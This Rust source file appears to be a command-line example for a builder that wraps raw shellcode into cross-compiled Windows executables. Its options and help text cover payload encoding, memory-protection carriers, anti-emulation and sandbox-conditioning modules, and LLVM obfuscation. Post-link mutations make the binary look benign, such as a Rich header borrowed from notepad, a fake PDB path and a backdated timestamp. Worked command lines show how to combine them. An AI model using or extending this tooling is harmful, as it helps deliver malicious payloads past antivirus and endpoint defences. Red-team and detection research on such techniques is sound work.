//! Build a Windows PE artifact using the full modular template pipeline.
//!
//! Calls `ArtifactBuilder.build(BuildInput::ModularTemplate { ... })` directly,
//! producing a cross-compiled Windows PE .exe via Clang/LLVM + xwin SDK.
//!
//! Requires: clang + lld-link + xwin SDK (run from WSL2).
//!
//! Usage:
//!   cargo run -p build --example build_artifact -- -p shellcode.bin
//!   cargo run -p build --example build_artifact -- -p sc.bin -o artifact.exe
//!   cargo run -p build --example build_artifact -- -p sc.bin --carrier peb_walk --encoding english
//!   cargo run -p build --example build_artifact -- -p sc.bin -m ast.string_xor --trace lines

use build::mutator::MutationSpec;
use build::{ArtifactBuilder, BuildInput, BuilderConfig, EncodingType, ModuleSelection};
use std::collections::HashMap;
use std::path::PathBuf;
use std::str::FromStr;
use std::{env, fs, process};

fn main() {
    let args = Args::parse();

    if args.help {
        print_help();
        return;
    }

    // Payload is required — no test fallback for real .exe builds
    let payload_path = match &args.payload {
        Some(p) => p.clone(),
        None => {
            eprintln!("Error: --payload / -p is required");
            eprintln!("Usage: cargo run -p build --example build_artifact -- -p <PAYLOAD.bin>");
            process::exit(1);
        }
    };

    let payload = fs::read(&payload_path).unwrap_or_else(|e| {
        eprintln!("Error reading payload '{}': {}", payload_path.display(), e);
        process::exit(1);
    });

    eprintln!(
        "[build_artifact] Payload: {} ({} bytes)",
        payload_path.display(),
        payload.len()
    );

    // Resolve paths from CARGO_MANIFEST_DIR (build/)
    let manifest = PathBuf::from(env!("CARGO_MANIFEST_DIR"));

    let config = BuilderConfig {
        output_dir: args.output_dir.clone(),
        xwin_dir: args.xwin,
        runtime_src: manifest.join("runtime/instrumentation_runtime.c"),
        minimal_runtime_src: manifest.join("runtime/minimal_runtime.c"),
        modular_template_dir: manifest.join("templates"),
    };

    let builder = ArtifactBuilder::new(config).unwrap_or_else(|e| {
        eprintln!("Error initializing builder: {}", e);
        process::exit(1);
    });

    // Parse encoding
    let encoding = EncodingType::from_str(&args.encoding).unwrap_or_else(|e| {
        eprintln!("Error: {}", e);
        process::exit(1);
    });

    // Build module selection
    let modules = ModuleSelection {
        carrier: args.carrier,
        decoder: args.decoder,
        antiemulation: args.antiemulation,
        deconditioner: args.deconditioner,
        guardrail: args.guardrail,
        virtualprotect: args.virtualprotect,
        decoy: args.decoy,
    };

    // Parse mutation specs (id:key=val,key=val syntax)
    let mutations: Vec<MutationSpec> = args
        .mutations
        .iter()
        .map(|s| parse_mutation_spec(s))
        .collect();

    let input = BuildInput::ModularTemplate {
        modules: modules.clone(),
        payload,
        encoding,
        mutations,
        trace_mode: args.trace.clone(),
        mutation_targets: vec![],
        sc_checkpoint_count: None,
    };

    eprintln!(
        "[build_artifact] Modules: carrier={}, decoder={}, antiemulation={}, deconditioner={}, guardrail={}, virtualprotect={}, decoy={}",
        modules.carrier,
        modules.decoder,
        modules.antiemulation,
        modules.deconditioner,
        modules.guardrail,
        modules.virtualprotect,
        modules.decoy,
    );
    eprintln!(
        "[build_artifact] Encoding: {}, Trace: {}",
        args.encoding, args.trace
    );
    if !args.mutations.is_empty() {
        eprintln!("[build_artifact] Mutations: {:?}", args.mutations);
    }

    // builder.build() is async — spin up a tokio runtime
    let rt = tokio::runtime::Runtime::new().unwrap_or_else(|e| {
        eprintln!("Failed to create tokio runtime: {}", e);
        process::exit(1);
    });

    let artifact = rt.block_on(builder.build(input)).unwrap_or_else(|e| {
        eprintln!("[build_artifact] Build FAILED: {:#}", e);
        process::exit(1);
    });

    // Print metadata
    eprintln!("[build_artifact] ─── Build succeeded ───");
    eprintln!("[build_artifact] artifact_id:  {}", artifact.artifact_id);
    eprintln!(
        "[build_artifact] size:         {} bytes",
        artifact.size_bytes
    );
    eprintln!(
        "[build_artifact] output:       {}",
        artifact.output_path.display()
    );
    eprintln!(
        "[build_artifact] mutations:    {:?}",
        artifact.mutations_applied
    );
    eprintln!(
        "[build_artifact] compiler:     {}",
        artifact.compiler_version
    );

    // Copy to user-specified path if -o given
    if let Some(dest) = &args.output {
        fs::copy(&artifact.output_path, dest).unwrap_or_else(|e| {
            eprintln!("Error copying artifact to '{}': {}", dest.display(), e);
            process::exit(1);
        });
        eprintln!("[build_artifact] Copied -> {}", dest.display());
    }
}

// ── Args ────────────────────────────────────────────────────────────────────

struct Args {
    help: bool,
    payload: Option<PathBuf>,
    output: Option<PathBuf>,
    carrier: String,
    decoder: String,
    antiemulation: String,
    deconditioner: String,
    guardrail: String,
    virtualprotect: String,
    decoy: String,
    encoding: String,
    trace: String,
    mutations: Vec<String>,
    xwin: PathBuf,
    output_dir: PathBuf,
    // Track which flags the user explicitly set (for auto-sync)
    decoder_set: bool,
    encoding_set: bool,
}

impl Args {
    fn parse() -> Self {
        let mut a = Args {
            help: false,
            payload: None,
            output: None,
            carrier: "change_rw_rx".into(),
            decoder: "xor".into(),
            antiemulation: "none".into(),
            deconditioner: "none".into(),
            guardrail: "env".into(),
            virtualprotect: "standard".into(),
            decoy: "winexec".into(),
            encoding: "xor".into(),
            trace: "off".into(),
            mutations: vec![],
            xwin: PathBuf::from("/root/.xwin"),
            output_dir: PathBuf::from("./artifacts"),
            decoder_set: false,
            encoding_set: false,
        };
        let argv: Vec<String> = env::args().skip(1).collect();
        let mut i = 0;
        while i < argv.len() {
            match argv[i].as_str() {
                "--help" | "-h" => a.help = true,
                "--payload" | "-p" => {
                    i += 1;
                    a.payload = Some(PathBuf::from(&argv[i]));
                }
                "--output" | "-o" => {
                    i += 1;
                    a.output = Some(PathBuf::from(&argv[i]));
                }
                "--carrier" => {
                    i += 1;
                    a.carrier = argv[i].clone();
                }
                "--decoder" => {
                    i += 1;
                    a.decoder = argv[i].clone();
                    a.decoder_set = true;
                }
                "--antiemulation" => {
                    i += 1;
                    a.antiemulation = argv[i].clone();
                }
                "--deconditioner" => {
                    i += 1;
                    a.deconditioner = argv[i].clone();
                }
                "--guardrail" => {
                    i += 1;
                    a.guardrail = argv[i].clone();
                }
                "--virtualprotect" => {
                    i += 1;
                    a.virtualprotect = argv[i].clone();
                }
                "--decoy" => {
                    i += 1;
                    a.decoy = argv[i].clone();
                }
                "--encoding" => {
                    i += 1;
                    a.encoding = argv[i].clone();
                    a.encoding_set = true;
                }
                "--trace" => {
                    i += 1;
                    a.trace = argv[i].clone();
                }
                "--mutation" | "-m" => {
                    i += 1;
                    a.mutations.push(argv[i].clone());
                }
                "--xwin" => {
                    i += 1;
                    a.xwin = PathBuf::from(&argv[i]);
                }
                "--output-dir" => {
                    i += 1;
                    a.output_dir = PathBuf::from(&argv[i]);
                }
                other => {
                    eprintln!("Unknown argument: {}", other);
                    process::exit(1);
                }
            }
            i += 1;
        }

        // Auto-sync encoding ↔ decoder:
        // - If user set only --decoder, sync encoding to match
        // - If user set only --encoding, sync decoder to match
        // - If both set, encoding wins (builder enforces this too)
        // - If neither set, both default to "xor"
        if a.decoder_set && !a.encoding_set {
            a.encoding = a.decoder.clone();
            eprintln!(
                "[build_artifact] Auto-synced encoding to '{}' (from --decoder)",
                a.encoding
            );
        } else if a.encoding_set && !a.decoder_set {
            a.decoder = a.encoding.clone();
            eprintln!(
                "[build_artifact] Auto-synced decoder to '{}' (from --encoding)",
                a.decoder
            );
        }

        a
    }
}

/// Parse "id:key=val,key=val" into a MutationSpec.
/// Examples:
///   "ast.string_xor"                        → id="ast.string_xor", params={}
///   "ast.decon_rounds:count=50,method=fixed" → id="ast.decon_rounds", params={count:50, method:fixed}
///   "binary.size_pad:target_kb=256"         → id="binary.size_pad", params={target_kb:256}
fn parse_mutation_spec(s: &str) -> MutationSpec {
    if let Some((id, params_str)) = s.split_once(':') {
        let params: HashMap<String, String> = params_str
            .split(',')
            .filter_map(|kv| {
                let (k, v) = kv.split_once('=')?;
                Some((k.to_string(), v.to_string()))
            })
            .collect();
        MutationSpec {
            id: id.to_string(),
            params,
        }
    } else {
        MutationSpec {
            id: s.to_string(),
            params: HashMap::new(),
        }
    }
}

fn print_help() {
    eprintln!(
        r#"build_artifact — Build a Windows PE artifact using the full modular template pipeline

Calls ArtifactBuilder.build(BuildInput::ModularTemplate) to produce a cross-compiled
Windows PE .exe via Clang/LLVM + xwin SDK.  Requires WSL2 with clang + lld + xwin.

USAGE:
    cargo run -p build --example build_artifact -- -p <PAYLOAD> [OPTIONS]

REQUIRED:
    -p, --payload <FILE>            Raw .bin payload

OPTIONS:
    -h, --help                      Show this help
    -o, --output <FILE>             Copy final .exe to this path (default: print artifact path)
    --carrier <NAME>                change_rw_rx | alloc_rw_rx | peb_walk  (default: change_rw_rx)
    --decoder <NAME>                xor | english  (default: xor)
    --antiemulation <NAME>          none | sirallocalot | timeraw | cpuburn | heapstress | fsenum | sleepaccel  (default: none)
    --deconditioner <NAME>          none | alloc_loop | alloc_exec | thread_alloc | mixed_apis | entropy_flood  (default: none)
    --guardrail <NAME>              env | none  (default: env)
    --virtualprotect <NAME>         standard | undersized  (default: standard)
    --decoy <NAME>                  winexec | none  (default: winexec)
    --encoding <TYPE>               xor | english  (default: xor)
    --trace <MODE>                  off | lines  (default: off)
    -m, --mutation <ID[:params]>     Mutation to apply (repeatable). Params: key=val,key=val
    --xwin <DIR>                    xwin SDK path (default: /root/.xwin)
    --output-dir <DIR>              Build output dir (default: ./artifacts)

MUTATION SYNTAX:
    -m <id>                         No params (uses defaults)
    -m <id>:key=val                 Single param
    -m <id>:k1=v1,k2=v2            Multiple params

AST MUTATIONS (applied to C source before compilation):
    ast.string_xor                  XOR-encode string literals (param: xor_key=0xAA)
    ast.decon_rounds                Loop count (params: count=20, method=fixed|runtime)
    ast.fill_pattern                Fill data (params: pattern=xor|nop_sled|random|zero)
    ast.exec_decoy                  Execute from alloc'd mem (params: method=none|direct|thread)
    ast.timing_pattern              Inter-op delays (params: min_ms=10, max_ms=100)
    ast.protection_transition       Mem protection (params: pattern=rw_rx|rw_rwx|rw_r_rx)

LLVM MUTATIONS (applied to LLVM IR):
    llvm.nop_insert                 NOP insertion (param: density=0.3)
    llvm.opaque_predicate           Opaque predicates (param: density=0.3)
    llvm.junk_block                 Dead blocks (param: count=2)

BINARY MUTATIONS (applied post-link to the PE file):
    binary.rich_header              Inject MSVC Rich header (param: donor=notepad|calc|explorer)
    binary.import_pad               Add benign imports (param: count=50)
    binary.resource_inject          Add version info + manifest (params: product_name=..., company=...)
    binary.section_rename           Rename sections to MSVC defaults (no params)
    binary.debug_dir                Add fake PDB debug directory (param: pdb_path=...)
    binary.timestamp                Backdate PE timestamp (params: age_days=365, timestamp=<epoch>)
    binary.string_inject            Benign strings (consolidated padding) (param: count=20)
    binary.entropy_normalize        Low-entropy padding (consolidated) (param: target=6.0)
    binary.size_pad                 Pad PE to target size (consolidated) (param: target_kb=256)

    Note: string_inject, entropy_normalize, size_pad are consolidated into a
    single .rdata section to avoid creating multiple non-standard sections.

EXAMPLES:
    # Default build
    cargo run -p build --example build_artifact -- -p shellcode.bin -o artifact.exe

    # With AST mutation + params
    cargo run -p build --example build_artifact -- -p sc.bin -m ast.string_xor:xor_key=0xBB -o mutated.exe

    # With tracing
    cargo run -p build --example build_artifact -- -p sc.bin --trace lines -o traced.exe

    # All binary mutations (recommended order)
    cargo run -p build --example build_artifact -- -p sc.bin \
      -m binary.rich_header:donor=notepad \
      -m binary.import_pad:count=50 \
      -m binary.resource_inject \
      -m binary.debug_dir \
      -m binary.section_rename \
      -m binary.timestamp:age_days=180 \
      -m binary.string_inject:count=25 \
      -m binary.size_pad:target_kb=256 \
      -m binary.entropy_normalize:target=6.0 \
      -o normalized.exe

    # Mixed AST + binary mutations
    cargo run -p build --example build_artifact -- -p sc.bin \
      --deconditioner basic \
      -m ast.decon_rounds:count=50,method=fixed \
      -m ast.timing_pattern:min_ms=50,max_ms=200 \
      -m binary.rich_header \
      -m binary.import_pad:count=15 \
      -m binary.size_pad:target_kb=128 \
      -o combined.exe

    # Custom xwin path
    cargo run -p build --example build_artifact -- -p sc.bin --xwin /opt/xwin -o out.exe"#
    );
}
